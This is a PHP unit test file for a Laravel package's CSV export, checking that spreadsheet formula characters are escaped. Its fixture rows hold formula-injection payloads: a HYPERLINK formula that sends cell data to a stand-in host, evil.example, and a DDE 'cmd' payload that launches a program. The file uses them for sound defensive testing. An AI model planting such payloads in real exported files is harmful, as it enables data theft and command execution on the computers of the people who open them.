<?php

namespace audunru\ExportResponse\Tests\Unit;

use audunru\ExportResponse\Tests\TestCase;
use Illuminate\Support\LazyCollection;
use Illuminate\Testing\TestResponse;

class CollectionToCsvTest extends TestCase
{
    private const ROWS = [
        ['id' => 1, 'name' => '=HYPERLINK("https://evil.example/?x="&A1,"Click")', '=key' => 'Navn', 'amount' => -5, 'meta' => null],
        ['id' => 2, 'name' => "+cmd|' /C calc'!A0", '=key' => '@SUM(A1)', 'amount' => '-5', 'meta' => '-1+2'],
        ['id' => 3, 'name' => "\tfoo", '=key' => "\rfoo", 'amount' => '+1.5', 'meta' => 'Noe annet'],
    ];

    private const EXPECTED = [
        ['id', 'name', "'=key", 'amount', 'meta'],
        ['1', '\'=HYPERLINK("https://evil.example/?x="&A1,"Click")', 'Navn', '-5', ''],
        ['2', "'+cmd|' /C calc'!A0", "'@SUM(A1)", '-5', "'-1+2"],
        ['3', "'\tfoo", "'\rfoo", '+1.5', 'Noe annet'],
    ];

    public function test_it_does_not_escape_formula_characters_by_default()
    {
        $response = new TestResponse(collect([['=key' => '=1+1', 'amount' => '-5,00']])->toCsv('filename.csv'));

        $this->assertEquals([['=key', 'amount'], ['=1+1', '-5,00']], $this->parseCsv($response->streamedContent()));
    }

    public function test_it_escapes_formula_characters()
    {
        config(['export-response.escape-csv-formulas' => true]);
        $response = new TestResponse(collect(self::ROWS)->toCsv('filename.csv'));

        $this->assertEquals(self::EXPECTED, $this->parseCsv($response->streamedContent()));
    }

    public function test_it_escapes_formula_characters_from_lazy_collection()
    {
        config(['export-response.escape-csv-formulas' => true]);
        $response = new TestResponse(LazyCollection::make(self::ROWS)->toCsv('filename.csv'));

        $this->assertEquals(self::EXPECTED, $this->parseCsv($response->streamedContent()));
    }

    private function parseCsv(string $content): array
    {
        $stream = fopen('php://memory', 'r+');
        fwrite($stream, $content);
        rewind($stream);

        $rows = [];
        while (($row = fgetcsv($stream, escape: '')) !== false) {
            $rows[] = $row;
        }
        fclose($stream);

        return $rows;
    }
}
